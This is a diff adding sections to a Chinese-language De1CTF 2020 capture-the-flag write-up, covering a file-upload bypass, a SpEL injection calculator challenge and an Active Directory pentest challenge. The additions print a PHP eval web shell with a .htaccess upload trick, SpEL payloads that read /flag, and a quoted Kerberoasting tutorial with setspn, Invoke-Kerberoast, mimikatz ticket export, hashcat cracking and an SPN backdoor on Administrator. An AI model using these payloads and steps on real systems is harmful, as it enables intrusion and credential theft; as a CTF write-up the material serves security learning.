@@ -106,6 +106,17 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[2333]); ?&gt;</span><br><span class="line">PD9waHAgZXZhbCgkX1BPU1RbMjMzM10pOyA&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/05/04/De1CTF-writeup/image-20200504103011171.png" alt="image-20200504103011171"></p>
+<blockquote>
+<p>看了venom wp后用下面的也可以</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;fileUpload&quot;; filename&#x3D;&quot;.htaccess&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">AddType application&#x2F;x-httpd-p\</span><br><span class="line">hp .qiu</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;fileUpload&quot;; filename&#x3D;&quot;1.qiu&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">&lt;?&#x3D;eval($_POST[1]);</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="/2020/05/04/De1CTF-writeup/image-20200506115151989.png" alt="image-20200506115151989"></p>
+<p><img src="/2020/05/04/De1CTF-writeup/image-20200506115314114.png" alt="image-20200506115314114"></p>
+<p><img src="/2020/05/04/De1CTF-writeup/image-20200506115256033.png" alt="image-20200506115256033"></p>
+<p>然后看下phpinfo里短标签的设置，这里明明是Off，😵😵😵😵😵😵😵</p>
+<p><img src="/2020/05/04/De1CTF-writeup/image-20200506115401614.png" alt="image-20200506115401614"></p>
+<p>查一下php手册，我靠知识点啊。不用闭合就能用，tql。</p>
+<p><img src="/2020/05/04/De1CTF-writeup/image-20200506115509609.png" alt="image-20200506115509609"></p>
 <h1 id="0x02-calc"><a href="#0x02-calc" class="headerlink" title="0x02 calc"></a>0x02 calc</h1><p>通过fuzz发现报错信息，</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"timestamp"</span>:<span class="string">"2020-05-04T02:36:32.156+0000"</span>,<span class="attr">"status"</span>:<span class="number">500</span>,<span class="attr">"error"</span>:<span class="string">"Internal Server Error"</span>,<span class="attr">"message"</span>:<span class="string">"Expression [@] @0: EL1059E: @ or &amp; can only be followed by an identifier or a quoted name"</span>,<span class="attr">"path"</span>:<span class="string">"/spel/calc"</span>&#125;</span><br></pre></td></tr></table></figure>
 
@@ -117,6 +128,12 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NeW java.io.BufferedReader(NeW java.io.FileReader(<span class="string">"%2fflag"</span>)).readLine()</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/05/04/De1CTF-writeup/image-20200504103504749.png" alt="image-20200504103504749"></p>
+<p>记录下其他的用法</p>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.class.forName(&#39;java.nio.file.Files&#39;).readAllLines(&#39;&#39;.class.forName(&#39;java.nio.file.Paths&#39;).get(&#39;&#x2F;flag&#39;))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">neW java.util.Scanner(neW java.io.File(&#39;&#x2F;flag&#39;)).next()</span><br></pre></td></tr></table></figure>
+</blockquote>
 <h1 id="0x03-Hard-Pentest-1"><a href="#0x03-Hard-Pentest-1" class="headerlink" title="0x03 Hard_Pentest_1"></a>0x03 <strong>Hard_Pentest_1</strong></h1><p>文件内容不能包含</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[a-z0-9;~^&#96;&amp;|]</span><br></pre></td></tr></table></figure>
 
@@ -225,6 +242,193 @@
 <p>然后去找minclude.so ，然后找minclude.so</p>
 <p><img src="/2020/05/04/De1CTF-writeup/image-20200505171730531.png" alt="image-20200505171730531"></p>
 <p>之后去下载minclude.so文件，这里我开始用脚本提出来的有问题，最后用burp可以提取出来，用burp的右键copy to file就可以保存so文件，之后就试pwn了。</p>
+<h1 id="0x06-Hard-Pentest-2"><a href="#0x06-Hard-Pentest-2" class="headerlink" title="0x06 Hard_Pentest_2"></a>0x06 Hard_Pentest_2</h1><p>执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -sc getacls -sddlfilter ;;;;;de1ctf2020\web -recmute</span><br></pre></td></tr></table></figure>
+
+<p>可得</p>
+<p><img src="/2020/05/04/De1CTF-writeup/image-20200506082021322.png" alt="image-20200506082021322"></p>
+<p>web用户具有对De1ta用户的SPN的设置权限。具体可以参考下面：</p>
+<blockquote>
+<h3 id="2-servicePrincipalName-28630EBB-41D5-11D1-A9C1-0000F80367C1"><a href="#2-servicePrincipalName-28630EBB-41D5-11D1-A9C1-0000F80367C1" class="headerlink" title="(2)  servicePrincipalName(28630EBB-41D5-11D1-A9C1-0000F80367C1)"></a><strong>(2)  servicePrincipalName(28630EBB-41D5-11D1-A9C1-0000F80367C1)</strong></h3><p>如果对一个对象有写入spn的权限，那么就可以对这个对象进行kerberosting了，如果密码强度不强的话，有机会获取到密码。</p>
+<p><img src="/2020/05/04/De1CTF-writeup/t013148e2dda10cec6e.png" alt="img"></p>
+<p><img src="/2020/05/04/De1CTF-writeup/t0159a1c8ffeda51224.png" alt="img"></p>
+<p><img src="/2020/05/04/De1CTF-writeup/t011e4510fd1f6596c9.png" alt="img"></p>
+<p>有权限，可以设置spn</p>
+<p><img src="/2020/05/04/De1CTF-writeup/t01a3ac6723857c3446.png" alt="img"></p>
+<p>查看spn</p>
+<p><img src="/2020/05/04/De1CTF-writeup/t01710d8bd30669d01d.png" alt="img"></p>
+<p>kerberoasting</p>
+<p><img src="/2020/05/04/De1CTF-writeup/t014fc208e692a0e20e.png" alt="img"></p>
+<p><a href="https://daiker.gitbook.io/windows-protocol/ldap-pian/12" target="_blank" rel="noopener">参考</a></p>
+</blockquote>
+<p>然后去设置spn，spn是win自带的工具，不用上传，</p>
+<p><img src="/2020/05/04/De1CTF-writeup/image-20200506084714658.png" alt="image-20200506084714658"></p>
+<p>利用spn进行kerberoasting的原理可以参考<a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/" target="_blank" rel="noopener">下面</a>3gstudent师傅文章。</p>
+<blockquote>
+<h3 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h3><p>官方文档：</p>
+<p><a href="https://docs.microsoft.com/en-us/windows/desktop/AD/service-principal-names" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/desktop/AD/service-principal-names</a></p>
+<p>全称<code>Service Principal Names</code></p>
+<p>SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN</p>
+<p>SPN分为两种，一种注册在AD上机器帐户(Computers)下，另一种注册在域用户帐户(Users)下</p>
+<p>当一个服务的权限为<code>Local System</code>或<code>Network Service</code>，则SPN注册在机器帐户(Computers)下</p>
+<p>当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下</p>
+<h3 id="SPN的格式"><a href="#SPN的格式" class="headerlink" title="SPN的格式"></a>SPN的格式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serviceclass&#x2F;host:port&#x2F;servicename</span><br></pre></td></tr></table></figure>
+
+<p>说明：</p>
+<ul>
+<li>serviceclass可以理解为服务的名称，常见的有www, ldap, SMTP, DNS, HOST等</li>
+<li>host有两种形式，FQDN和NetBIOS名，例如server01.test.com和server01</li>
+<li>如果服务运行在默认端口上，则端口号(port)可以省略</li>
+</ul>
+<h3 id="查询SPN"><a href="#查询SPN" class="headerlink" title="查询SPN"></a>查询SPN</h3><p>对域控制器发起LDAP查询，这是正常kerberos票据行为的一部分，因此查询SPN的操作很难被检测</p>
+<h4 id="1-使用SetSPN"><a href="#1-使用SetSPN" class="headerlink" title="(1) 使用SetSPN"></a>(1) 使用SetSPN</h4><p>Win7和Windows Server2008自带的工具</p>
+<p>查看当前域内的所有SPN：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe -q *&#x2F;*</span><br></pre></td></tr></table></figure>
+
+<p>查看test域内的所有SPN：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe -T test -q *&#x2F;*</span><br></pre></td></tr></table></figure>
+
+<p>输出结果实例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">CN&#x3D;DC1,OU&#x3D;Domain Controllers,DC&#x3D;test,DC&#x3D;com</span><br><span class="line">        exchangeRFR&#x2F;DC1</span><br><span class="line">        exchangeRFR&#x2F;DC1.test.com</span><br><span class="line">        exchangeMDB&#x2F;DC1.test.com</span><br><span class="line">        exchangeMDB&#x2F;DC1</span><br><span class="line">        exchangeAB&#x2F;DC1</span><br><span class="line">        exchangeAB&#x2F;DC1.test.com</span><br><span class="line">        SMTP&#x2F;DC1</span><br><span class="line">        SMTP&#x2F;DC1.test.com</span><br><span class="line">        SmtpSvc&#x2F;DC1</span><br><span class="line">        SmtpSvc&#x2F;DC1.test.com</span><br><span class="line">        ldap&#x2F;DC1.test.com&#x2F;ForestDnsZones.test.com</span><br><span class="line">        ldap&#x2F;DC1.test.com&#x2F;DomainDnsZones.test.com</span><br><span class="line">        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04&#x2F;DC1.test.com</span><br><span class="line">        DNS&#x2F;DC1.test.com</span><br><span class="line">        GC&#x2F;DC1.test.com&#x2F;test.com</span><br><span class="line">        RestrictedKrbHost&#x2F;DC1.test.com</span><br><span class="line">        RestrictedKrbHost&#x2F;DC1</span><br><span class="line">        HOST&#x2F;DC1&#x2F;TEST</span><br><span class="line">        HOST&#x2F;DC1.test.com&#x2F;TEST</span><br><span class="line">        HOST&#x2F;DC1</span><br><span class="line">        HOST&#x2F;DC1.test.com</span><br><span class="line">        HOST&#x2F;DC1.test.com&#x2F;test.com</span><br><span class="line">        E3514235-4B06-11D1-AB04-00C04FC2DCD2&#x2F;0f33253b-2314-40f0-b665-f4317b13e6b9&#x2F;test.com</span><br><span class="line">        ldap&#x2F;DC1&#x2F;TEST</span><br><span class="line">        ldap&#x2F;0f33253b-2314-40f0-b665-f4317b13e6b9._msdcs.test.com</span><br><span class="line">        ldap&#x2F;DC1.test.com&#x2F;TEST</span><br><span class="line">        ldap&#x2F;DC1</span><br><span class="line">        ldap&#x2F;DC1.test.com</span><br><span class="line">        ldap&#x2F;DC1.test.com&#x2F;test.com</span><br><span class="line">CN&#x3D;krbtgt,CN&#x3D;Users,DC&#x3D;test,DC&#x3D;com</span><br><span class="line">        kadmin&#x2F;changepw</span><br><span class="line">CN&#x3D;COMPUTER01,CN&#x3D;Computers,DC&#x3D;test,DC&#x3D;com</span><br><span class="line">        RestrictedKrbHost&#x2F;COMPUTER01</span><br><span class="line">        HOST&#x2F;COMPUTER01</span><br><span class="line">        RestrictedKrbHost&#x2F;COMPUTER01.test.com</span><br><span class="line">        HOST&#x2F;COMPUTER01.test.com</span><br><span class="line">CN&#x3D;MSSQL Service Admin,CN&#x3D;Users,DC&#x3D;test,DC&#x3D;com</span><br><span class="line">        MSSQLSvc&#x2F;DC1.test.com</span><br></pre></td></tr></table></figure>
+
+<p>以CN开头的每一行代表一个帐户，其下的信息是与该帐户相关联的SPN</p>
+<p>对于上面的输出数据，机器帐户(Computers)为：</p>
+<ul>
+<li>CN=DC1,OU=Domain Controllers,DC=test,DC=com</li>
+<li>CN=COMPUTER01,CN=Computers,DC=test,DC=com</li>
+</ul>
+<p>域用户帐户(Users)为：</p>
+<ul>
+<li>CN=krbtgt,CN=Users,DC=test,DC=com</li>
+<li>CN=MSSQL Service Admin,CN=Users,DC=test,DC=com</li>
+</ul>
+<p>注册在域用户帐户(Users)下的SPN有两个：<code>kadmin/changepw</code>和<code>MSSQLSvc/DC1.test.com</code></p>
+<h2 id="0x03-Kerberoasting的原理"><a href="#0x03-Kerberoasting的原理" class="headerlink" title="0x03 Kerberoasting的原理"></a>0x03 Kerberoasting的原理</h2><hr>
+<h4 id="1、Kerberos认证过程"><a href="#1、Kerberos认证过程" class="headerlink" title="1、Kerberos认证过程"></a>1、Kerberos认证过程</h4><p>一个简单的Kerberos认证过程如下图</p>
+<p><img src="/2020/05/04/De1CTF-writeup/2-1.png" alt="Alt text"></p>
+<ol>
+<li>as_request</li>
+<li>as_reply</li>
+<li>tgs_request</li>
+<li>tgs_reply</li>
+<li>ap_request</li>
+<li>ap_reply</li>
+</ol>
+<p>对于4.tgs_reply，用户将会收到由目标服务实例的NTLM hash加密生成的TGS(service ticket)，加密算法为<code>RC4-HMAC</code></p>
+<p>站在利用的角度，当获得这个TGS后，我们可以尝试穷举口令，模拟加密过程，生成TGS进行比较。如果TGS相同，代表口令正确，就能获得目标服务实例的明文口令</p>
+<h4 id="2、Windows系统通过SPN查询获得服务和服务实例帐户的对应关系"><a href="#2、Windows系统通过SPN查询获得服务和服务实例帐户的对应关系" class="headerlink" title="2、Windows系统通过SPN查询获得服务和服务实例帐户的对应关系"></a>2、Windows系统通过SPN查询获得服务和服务实例帐户的对应关系</h4><p>这里举一个例子：</p>
+<p>用户a要访问MySQL服务的资源，进行到4.tgs_reply时，步骤如下：</p>
+<p>(1)Domain Controller查询MySQL服务的SPN</p>
+<p>如果该SPN注册在机器帐户(Computers)下，将会查询所有机器帐户(Computers)的servicePrincipalName属性，找到对应的帐户</p>
+<p>如果该SPN注册在域用户帐户(Users)下，将会查询所有域用户(Users)的servicePrincipalName属性，找到对应的帐户</p>
+<p>(2)找到对应的帐户后，使用该帐户的NTLM hash，生成TGS</p>
+<h4 id="3、域内的主机都能查询SPN"><a href="#3、域内的主机都能查询SPN" class="headerlink" title="3、域内的主机都能查询SPN"></a>3、域内的主机都能查询SPN</h4><h4 id="4、域内的任何用户都可以向域内的任何服务请求TGS"><a href="#4、域内的任何用户都可以向域内的任何服务请求TGS" class="headerlink" title="4、域内的任何用户都可以向域内的任何服务请求TGS"></a>4、域内的任何用户都可以向域内的任何服务请求TGS</h4><p>综上，域内的任何一台主机，都能够通过查询SPN，向域内的所有服务请求TGS，拿到TGS后对其进行暴力破解</p>
+<p>对于破解出的明文口令，只有域用户帐户(Users)的口令存在价值，不必考虑机器帐户的口令(无法用于远程连接)</p>
+<p>因此，高效率的利用思路如下：</p>
+<ol>
+<li>查询SPN，找到有价值的SPN，需要满足以下条件：<ul>
+<li>该SPN注册在域用户帐户(Users)下</li>
+<li>域用户账户的权限很高</li>
+</ul>
+</li>
+<li>请求TGS</li>
+<li>导出TGS</li>
+<li>暴力破解</li>
+</ol>
+<h2 id="0x04-Kerberoasting的实现方法一"><a href="#0x04-Kerberoasting的实现方法一" class="headerlink" title="0x04 Kerberoasting的实现方法一"></a>0x04 Kerberoasting的实现方法一</h2><hr>
+<h3 id="1、获得有价值的SPN"><a href="#1、获得有价值的SPN" class="headerlink" title="1、获得有价值的SPN"></a>1、获得有价值的SPN</h3><p>需要满足以下条件：</p>
+<ul>
+<li>该SPN注册在域用户帐户(Users)下</li>
+<li>域用户账户的权限很高</li>
+</ul>
+<p>可以选择以下三种方法：</p>
+<h4 id="1-使用powershell模块Active-Directory"><a href="#1-使用powershell模块Active-Directory" class="headerlink" title="(1)使用powershell模块Active Directory"></a>(1)使用powershell模块Active Directory</h4><p><strong>注：</strong></p>
+<p>powershell模块Active Directory 需要提前安装，域控制器一般会安装</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import-module ActiveDirectory</span><br><span class="line">get-aduser -filter &#123;AdminCount -eq 1 -and (servicePrincipalName -ne 0)&#125; -prop * |select name,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure>
+
+<p>对于未安装Active Directory模块的系统，可以通过如下命令导入Active Directory模块：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import-module .\Microsoft.ActiveDirectory.Management.dll</span><br></pre></td></tr></table></figure>
+
+<p>Microsoft.ActiveDirectory.Management.dll在安装powershell模块Active Directory后生成，我已经提取出来并上传至github：</p>
+<p><a href="https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll" target="_blank" rel="noopener">https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</a></p>
+<h4 id="2-使用PowerView"><a href="#2-使用PowerView" class="headerlink" title="(2)使用PowerView"></a>(2)使用PowerView</h4><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-使用kerberoast"><a href="#3-使用kerberoast" class="headerlink" title="(3)使用kerberoast"></a>(3)使用kerberoast</h4><p>powershell:</p>
+<p><a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1</a></p>
+<p>vbs:</p>
+<p><a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs</a></p>
+<p>参数如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript GetUserSPNs.vbs</span><br></pre></td></tr></table></figure>
+
+<h3 id="2、请求TGS"><a href="#2、请求TGS" class="headerlink" title="2、请求TGS"></a>2、请求TGS</h3><h4 id="1-请求指定TGS"><a href="#1-请求指定TGS" class="headerlink" title="(1)请求指定TGS"></a>(1)请求指定TGS</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$SPNName &#x3D; &#39;MSSQLSvc&#x2F;DC1.test.com&#39;</span><br><span class="line">Add-Type -AssemblyNAme System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-请求所有TGS"><a href="#2-请求所有TGS" class="headerlink" title="(2)请求所有TGS"></a>(2)请求所有TGS</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Add-Type -AssemblyName System.IdentityModel  </span><br><span class="line">setspn.exe -q *&#x2F;* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() &#125;  </span><br></pre></td></tr></table></figure>
+
+<p>执行后输入<code>klist</code>查看内存中的票据，可找到获得的TGS</p>
+<h3 id="3、导出"><a href="#3、导出" class="headerlink" title="3、导出"></a>3、导出</h3><p>使用mimikatz</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list &#x2F;export</span><br></pre></td></tr></table></figure>
+
+<h3 id="4、破解"><a href="#4、破解" class="headerlink" title="4、破解"></a>4、破解</h3><p><a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;tgsrepcrack.py wordlist.txt test.kirbi</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-Kerberoasting的实现方法二"><a href="#0x05-Kerberoasting的实现方法二" class="headerlink" title="0x05 Kerberoasting的实现方法二"></a>0x05 Kerberoasting的实现方法二</h2><hr>
+<p>自动实现，并且不需要mimikatz，普通用户权限即可，参考资料：</p>
+<p><a href="http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/</a></p>
+<p>代码地址：</p>
+<p><a href="https://github.com/EmpireProject/Empire/commit/6ee7e036607a62b0192daed46d3711afc65c3921" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire/commit/6ee7e036607a62b0192daed46d3711afc65c3921</a></p>
+<p>使用<code>System.IdentityModel.Tokens.KerberosRequestorSecurityToken</code>请求TGS，在返回结果中提取出TGS，输出的TGS可选择John the Ripper或Hashcat进行破解</p>
+<p>实例演示：</p>
+<p>在域内一台主机上以普通用户权限执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl</span><br></pre></td></tr></table></figure>
+
+<p>-AdminCount表示选择高权限的用户</p>
+<p>输出结果如下图</p>
+<p><img src="/2020/05/04/De1CTF-writeup/2-2.png" alt="Alt text"></p>
+<p>只提取出hash的参数如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation</span><br></pre></td></tr></table></figure>
+
+<p>输出结果如下图</p>
+<p><img src="/2020/05/04/De1CTF-writeup/2-3.png" alt="Alt text"></p>
+<p>使用hashcat破解的参数如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 &#x2F;tmp&#x2F;hash.txt &#x2F;tmp&#x2F;password.list -o found.txt --force</span><br></pre></td></tr></table></figure>
+
+<p>破解结果如下图，成功获得明文口令<code>MySQLAdmin111!</code></p>
+<p><img src="/2020/05/04/De1CTF-writeup/2-4.png" alt="Alt text"></p>
+<p><strong>注：</strong></p>
+<p>Rubeus也可以实现Invoke-Kerberoast的功能，地址如下：</p>
+<p><a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">https://github.com/GhostPack/Rubeus</a></p>
+<p>参数如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe kerberoast</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x06-Kerberoasting的后门利用"><a href="#0x06-Kerberoasting的后门利用" class="headerlink" title="0x06 Kerberoasting的后门利用"></a>0x06 Kerberoasting的后门利用</h2><hr>
+<p>在我们取得了SPN的修改权限后，可以为指定的域用户添加一个SPN，这样可以随时获得该域用户的TGS，经过破解后获得明文口令</p>
+<p>例如为域用户<code>Administrator</code>添加<code>SPNVNC/DC1.test.com</code>，参数如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe -U -A VNC&#x2F;DC1.test.com Administrator</span><br></pre></td></tr></table></figure>
+
+<p>如下图</p>
+<p><img src="/2020/05/04/De1CTF-writeup/3-1.png" alt="Alt text"></p>
+<p>在域内任意一台主机都能获得该SPN，并且能够使用Kerberoast获得TGS，如下图</p>
+<p><img src="/2020/05/04/De1CTF-writeup/3-2.png" alt="Alt text"></p>
+<p>再使用hashcat破解即可</p>
+<p><strong>补充：</strong></p>
+<p>删除SPN的参数如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe -D VNC&#x2F;DC1.test.com Administrator</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>这里用rubeu.exe进行Kerberoastong攻击，拿到De1ta的spn hash,然后用hashcat暴力破解hash,我这里没有编译好Rubeus，就直接用师傅得出来的密码去下一步了。对应的命令如下，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe kerberoast</span><br><span class="line">.&#x2F;hashcat64.bin -a 3 -m 13100 de1ta_spn.txt ?h?h?h?h?h?h?h?h</span><br></pre></td></tr></table></figure>
+
+<p>前面已经提示了De1ta有特殊的扩展权限，然后再用adfind去查看De1ta的acl权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -sc getacls -sddlfilter ;;;;;de1ctf2020\De1ta -recmute</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/04/De1CTF-writeup/image-20200506085227520.png" alt="image-20200506085227520"></p>
+<p>可以看到上图框中的三个权限，大佬说上面三个权限可以进行DCShadow攻击，具体攻击原理可以看<a href="https://blog.riskivy.com/dcshadow/" target="_blank" rel="noopener">https://blog.riskivy.com/dcshadow/</a>这篇文章，进行DCShadow攻击需要打开两个mimikatz窗口，所以需要</p>
+<p><a href="https://daiker.gitbook.io/" target="_blank" rel="noopener">https://daiker.gitbook.io/</a></p>
+<p><a href="https://www.secpulse.com/archives/72190.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/72190.html</a>  rdp</p>
+<p><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py</a>   keburo</p>
+<p><a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">https://github.com/GhostPack/Rubeus</a>  keboro</p>
+<p>参考</p>
+<p><a href="https://mp.weixin.qq.com/s/1CR0up_b5a1zw02wZNwJpg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/1CR0up_b5a1zw02wZNwJpg</a></p>
 
       
     </div>
